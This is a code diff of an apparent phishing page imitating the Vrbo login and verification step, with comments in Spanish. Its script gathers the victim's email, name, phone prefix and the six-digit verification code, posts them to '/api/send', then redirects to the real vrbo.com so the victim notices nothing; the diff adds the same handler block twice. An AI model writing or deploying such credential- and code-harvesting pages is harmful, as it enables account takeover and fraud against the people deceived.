@@ -92,29 +92,58 @@
   const verifyInput = document.getElementById('verifyCode');
   const btnConfirm = document.getElementById('btn-confirm');
   const loader = document.getElementById('page-loader');
-  verifyInput.addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/[^0-9]/g, '');
-    btnConfirm.disabled = e.target.value.length !== 6;
+
+  verifyInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    btnConfirm.disabled = this.value.length !== 6;
   });
-  // En vrbologin4.html, reemplaza el submit del verify-form:
-// Reemplaza el submit del verify-form
-document.getElementById('verify-form').addEventListener('submit', (e) => {
-  e.preventDefault();
-  btnConfirm.disabled = true;
-  loader.classList.add('is-visible');
 
-  const correo = sessionStorage.getItem('vrbo_correo') || '';
-  const nombre = sessionStorage.getItem('vrbo_nombre') || '';
-  const lada   = sessionStorage.getItem('vrbo_lada')   || '';
-  const numero = verifyInput.value; // ← código 6 dígitos = "numero"
+  document.getElementById('verify-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    btnConfirm.disabled = true;
+    loader.classList.add('is-visible');
 
-                                                        fetch('/api/send', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ correo, nombre, lada, numero })
-}).finally(() => {
-  setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
-});
+    const correo = sessionStorage.getItem('vrbo_correo') || '';
+    const nombre = sessionStorage.getItem('vrbo_nombre') || '';
+    const lada   = sessionStorage.getItem('vrbo_lada')   || '';
+    const numero = verifyInput.value;
+
+    fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ correo, nombre, lada, numero })
+    }).finally(() => {
+      setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
+    });
+  });
+</script><script>
+  const verifyInput = document.getElementById('verifyCode');
+  const btnConfirm = document.getElementById('btn-confirm');
+  const loader = document.getElementById('page-loader');
+
+  verifyInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    btnConfirm.disabled = this.value.length !== 6;
+  });
+
+  document.getElementById('verify-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    btnConfirm.disabled = true;
+    loader.classList.add('is-visible');
+
+    const correo = sessionStorage.getItem('vrbo_correo') || '';
+    const nombre = sessionStorage.getItem('vrbo_nombre') || '';
+    const lada   = sessionStorage.getItem('vrbo_lada')   || '';
+    const numero = verifyInput.value;
+
+    fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ correo, nombre, lada, numero })
+    }).finally(() => {
+      setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
+    });
+  });
 </script>
 </body>
 </html>
